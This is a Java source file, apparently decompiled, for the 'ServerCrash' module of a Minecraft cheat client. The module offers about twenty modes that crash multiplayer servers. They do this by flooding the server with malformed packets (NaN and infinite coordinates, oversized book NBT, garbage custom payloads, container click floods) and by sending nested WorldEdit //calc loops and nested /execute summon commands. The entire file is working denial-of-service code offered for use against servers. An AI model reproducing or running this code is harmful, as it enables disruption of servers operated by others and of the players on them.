package Method.Client.module.misc;

import Method.Client.managers.*;
import Method.Client.utils.*;
import Method.Client.module.*;
import Method.Client.*;
import Method.Client.utils.visual.*;
import io.netty.buffer.*;
import net.minecraft.network.*;
import net.minecraftforge.fml.common.gameevent.*;
import net.minecraft.inventory.*;
import net.minecraft.item.*;
import java.util.*;
import net.minecraft.util.math.*;
import net.minecraft.network.login.client.*;
import net.minecraft.network.status.client.*;
import net.minecraft.init.*;
import net.minecraft.nbt.*;
import org.apache.commons.lang3.*;
import net.minecraft.util.*;
import net.minecraft.network.play.client.*;
import net.minecraft.entity.*;
import Method.Client.utils.system.*;
import net.minecraft.network.play.server.*;

public class ServerCrash extends Module
{
    Setting mode;
    Setting Packets;
    Setting AutoDisable;
    Setting JustOnce;
    public static boolean isModeMCBrandModifier;
    public static boolean disableSafeGuard;
    public long longdong;
    TimerUtils timer;
    
    public ServerCrash() {
        super("ServerCrash", 0, Category.MISC, "Server Crash");
        this.mode = Main.setmgr.add(new Setting("Mode", this, "Velt", new String[] { "Velt", "Infinity", "Artemis.ac", "Artemis.ac2", "LiquidBounce-BookFlood", "Operator", "WorldEdit", "WorldEdit2", "TabComplete", "ItemSwitcher", "KeepAlives", "Animation", "Payload", "NewFunction", "Hand", "Swap", "Riding", "Container", "Tp" }));
        this.Packets = Main.setmgr.add(new Setting("Packets", this, 5000.0, 1.0, 10000.0, true));
        this.AutoDisable = Main.setmgr.add(new Setting("AutoDisable", this, false));
        this.JustOnce = Main.setmgr.add(new Setting("JustOnce", this, true));
        this.longdong = 0L;
        this.timer = new TimerUtils();
    }
    
    @Override
    public void onDisable() {
        ServerCrash.disableSafeGuard = false;
        ServerCrash.isModeMCBrandModifier = false;
        this.longdong = 15000L;
    }
    
    @Override
    public void onEnable() {
        ChatUtils.warning("This May - Will Crash You!");
        if (this.mode.getValString().equalsIgnoreCase("Payload")) {
            final PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
            packetbuffer.writeLong(Long.MAX_VALUE);
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|AdvCdm", packetbuffer));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
            for (int j = 0; j < this.Packets.getValDouble(); ++j) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(0L));
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
            ServerCrash.mc.field_71439_g.func_70634_a(ServerCrash.mc.field_71439_g.field_70165_t, Double.NaN, ServerCrash.mc.field_71439_g.field_70161_v);
        }
        this.longdong = 15000L;
    }
    
    @Override
    public void onClientTick(final TickEvent.ClientTickEvent event) {
        ServerCrash.disableSafeGuard = true;
        new PacketBuffer(Unpooled.buffer().writeByte(Integer.MAX_VALUE));
        if (this.mode.getValString().equalsIgnoreCase("Container")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketClickWindow(Integer.MIN_VALUE, Integer.MIN_VALUE, Integer.MIN_VALUE, ClickType.CLONE, (ItemStack)null, (short)1));
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketClickWindow(Integer.MAX_VALUE, Integer.MAX_VALUE, 1, ClickType.CLONE, ItemStack.field_190927_a, (short)1));
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketCloseWindow(Integer.MIN_VALUE));
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketCloseWindow(Integer.MAX_VALUE));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Tp")) {
            Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, new Random().nextBoolean()));
            double y = 0.0;
            double z = 0.0;
            for (int e = 0; e < this.Packets.getValDouble(); ++e) {
                y = e * 9;
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(ServerCrash.mc.field_71439_g.field_70165_t, ServerCrash.mc.field_71439_g.field_70163_u + y, ServerCrash.mc.field_71439_g.field_70161_v, new Random().nextBoolean()));
            }
            for (int bb = 0; bb < this.Packets.getValDouble() * 10.0; ++bb) {
                z = bb * 9;
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(ServerCrash.mc.field_71439_g.field_70165_t, ServerCrash.mc.field_71439_g.field_70163_u + y, ServerCrash.mc.field_71439_g.field_70161_v + z, new Random().nextBoolean()));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Hand")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketAnimation(EnumHand.MAIN_HAND));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Swap")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.SWAP_HELD_ITEMS, BlockPos.field_177992_a, ServerCrash.mc.field_71439_g.func_174811_aO()));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Riding")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                final Entity riding = ServerCrash.mc.field_71439_g.func_184187_bx();
                if (riding != null) {
                    riding.field_70165_t = ServerCrash.mc.field_71439_g.field_70165_t;
                    riding.field_70163_u = ServerCrash.mc.field_71439_g.field_70163_u + 1337.0;
                    riding.field_70161_v = ServerCrash.mc.field_71439_g.field_70161_v;
                    ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketVehicleMove(riding));
                }
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("Artemis.ac2")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(Double.NaN, Double.NaN, Double.NaN, Float.NaN, Float.NaN, new Random().nextBoolean()));
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("Artemis.ac")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive(0L));
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("NewFunction")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketEncryptionResponse());
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketServerQuery());
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("Infinity")) {
            Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, Double.POSITIVE_INFINITY, new Random().nextBoolean()));
            Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, Double.NEGATIVE_INFINITY, new Random().nextBoolean()));
        }
        else if (this.mode.getValString().equalsIgnoreCase("Velt")) {
            if (ServerCrash.mc.field_71439_g.field_70173_aa < 100) {
                for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(ServerCrash.mc.field_71439_g.field_70165_t, ServerCrash.mc.field_71439_g.field_70163_u - 1.0, ServerCrash.mc.field_71439_g.field_70161_v, false));
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(ServerCrash.mc.field_71439_g.field_70165_t, Double.MAX_VALUE, ServerCrash.mc.field_71439_g.field_70161_v, false));
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.Position(ServerCrash.mc.field_71439_g.field_70165_t, ServerCrash.mc.field_71439_g.field_70163_u - 1.0, ServerCrash.mc.field_71439_g.field_70161_v, false));
                }
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("LiquidBounce-BookFlood")) {
            final String randomString = RandomStringUtils.random(8, "abcdefghijklmnopqrstuvwxyz1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ");
            final ItemStack bookStack = new ItemStack(Items.field_151099_bA);
            final NBTTagCompound bookCompound = new NBTTagCompound();
            bookCompound.func_74778_a("author", "FileExtension");
            bookCompound.func_74778_a("title", "\u00c2§8\u00c2§l[\u00c2§d\u00c2§lServerCrasher\u00c2§8\u00c2§l]");
            final NBTTagList pageList = new NBTTagList();
            for (int packets = 0; packets < 50; ++packets) {
                pageList.func_74742_a((NBTBase)new NBTTagString(randomString));
            }
            bookCompound.func_74782_a("pages", (NBTBase)pageList);
            bookStack.func_77982_d(bookCompound);
            for (int packets = 0; packets < this.Packets.getValDouble(); ++packets) {
                final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
                packetBuffer.func_150788_a(bookStack);
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload(new Random().nextBoolean() ? "MC|BSign" : "MC|BEdit", packetBuffer));
            }
        }
        if (this.mode.getValString().equalsIgnoreCase("FlexAir")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                final double rand1 = RandomUtils.nextDouble(0.1, 1.9);
                final double rand2 = RandomUtils.nextDouble(0.1, 1.9);
                final double rand3 = RandomUtils.nextDouble(0.1, 1.9);
                final int rand4 = RandomUtils.nextInt(0, Integer.MAX_VALUE);
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(ServerCrash.mc.field_71439_g.field_70165_t + 1257892.0 * rand1, ServerCrash.mc.field_71439_g.field_70163_u + 9871521.0 * rand2, ServerCrash.mc.field_71439_g.field_70161_v + 9081259.0 * rand3, ServerCrash.mc.field_71439_g.field_70177_z, ServerCrash.mc.field_71439_g.field_70125_A, new Random().nextBoolean()));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayer.PositionRotation(ServerCrash.mc.field_71439_g.field_70165_t - 9125152.0 * rand1, ServerCrash.mc.field_71439_g.field_70163_u - 1287664.0 * rand2, ServerCrash.mc.field_71439_g.field_70161_v - 4582135.0 * rand3, ServerCrash.mc.field_71439_g.field_70177_z, ServerCrash.mc.field_71439_g.field_70125_A, new Random().nextBoolean()));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive((long)rand4));
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("TabComplete")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                final double rand1 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                final double rand2 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                final double rand3 = RandomUtils.nextDouble(0.0, Double.MAX_VALUE);
                ChatUtils.error("This feature is temporarily disabled");
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("WorldEdit")) {
            if (ServerCrash.mc.field_71439_g.field_70173_aa % 2 == 0) {
                ServerCrash.mc.field_71439_g.func_71165_d("//calc for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                ServerCrash.mc.field_71439_g.func_71165_d("//calculate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                ServerCrash.mc.field_71439_g.func_71165_d("//solve for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                ServerCrash.mc.field_71439_g.func_71165_d("//evaluate for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
                ServerCrash.mc.field_71439_g.func_71165_d("//eval for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}");
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("DEV")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|Brand", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BOpen", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|TrList", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|TrSel", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BEdit", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("REGISTER", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
                Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("MC|BSign", new PacketBuffer(Unpooled.buffer().readerIndex(0).writerIndex(256).capacity(256)).func_180714_a("\u0102\ufffd\u00e2\u20ac\u201c\u0102\ufffd\u0106\u2019\u0102\ufffd\u010f\u017c\u02dd\u0102\ufffd\u010f\u017c\u02dd?\u0102\u201a\u00c2\u02dd\u0102\u201a\u00c2\u013du\u0102\u201a\u00c2§}e>?\"\u0102\ufffd\u00c2¨\u0102\ufffd\u00c2«\u0102\ufffd\u00c2\u02dd\u0102\ufffd\u00c2\u013d\u0102\ufffd\u00c2\u0105\u0102\ufffd\u00c2µ\u0102\ufffd\u00c2·\u0102\ufffd\u00c2\u0104\u0102\ufffd\u00c2\u02d8\u0102\ufffd\u010f\u017c\u02dd\u0102\u2026\u00c2\u013e\u0102\u2026\u00c2¸\u0102\u2020\u00e2\u20ac\u2122\u0102\ufffd\u0139\u013e")));
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("Operator")) {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                ServerCrash.mc.field_71439_g.func_71165_d("/execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ execute @e ~ ~ ~ summon Villager");
            }
        }
        else if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier")) {
            ServerCrash.isModeMCBrandModifier = true;
        }
        else if (!this.mode.getValString().equalsIgnoreCase("ItemSwitcher")) {
            if (this.mode.getValString().equalsIgnoreCase("KitmapSignInteract")) {
                for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                    ServerCrash.mc.func_147121_ag();
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketPlayerDigging(CPacketPlayerDigging.Action.DROP_ALL_ITEMS, new BlockPos(ServerCrash.mc.field_71439_g.field_70165_t, ServerCrash.mc.field_71439_g.field_70163_u, ServerCrash.mc.field_71439_g.field_70161_v), EnumFacing.UP));
                }
            }
            else if (this.mode.getValString().equalsIgnoreCase("WorldEdit2")) {
                for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketCustomPayload("WECUI", new PacketBuffer(Unpooled.buffer()).func_180714_a("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n")));
                }
            }
            else if (this.mode.getValString().equalsIgnoreCase("KeepAlives")) {
                for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                    final int r = RandomUtils.nextInt(0, 0);
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketKeepAlive((long)r));
                }
            }
            else if (this.mode.getValString().equalsIgnoreCase("Animation")) {
                for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                    ServerCrash.mc.field_71439_g.field_71174_a.func_147297_a((Packet)new CPacketAnimation());
                }
            }
        }
        else {
            for (int i = 0; i < this.Packets.getValDouble(); ++i) {
                for (int r = 0; r < 8; ++r) {
                    Wrapper.INSTANCE.sendPacket((Packet)new CPacketHeldItemChange(r));
                }
            }
        }
        if (this.timer.hasReached(this.longdong) && this.AutoDisable.getValBoolean()) {
            this.setToggled(false);
            this.timer.reset();
        }
        if (this.JustOnce.getValBoolean() && !this.mode.getValString().equalsIgnoreCase("MC|BrandModifier")) {
            this.setToggled(false);
        }
    }
    
    @Override
    public boolean onPacket(final Object packet, final Connection.Side side) {
        if (this.mode.getValString().equalsIgnoreCase("MC|BrandModifier") && packet instanceof CPacketCustomPayload) {
            final CPacketCustomPayload C17 = (CPacketCustomPayload)packet;
            C17.field_149562_a = "MC|Brand";
            C17.field_149561_c = new PacketBuffer(Unpooled.buffer()).func_180714_a("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        }
        if (this.timer.hasReached(this.longdong) && this.AutoDisable.getValBoolean()) {
            if (packet instanceof SPacketJoinGame) {
                this.setToggled(false);
            }
            if (packet instanceof SPacketDisconnect) {
                this.setToggled(false);
            }
        }
        return true;
    }
}
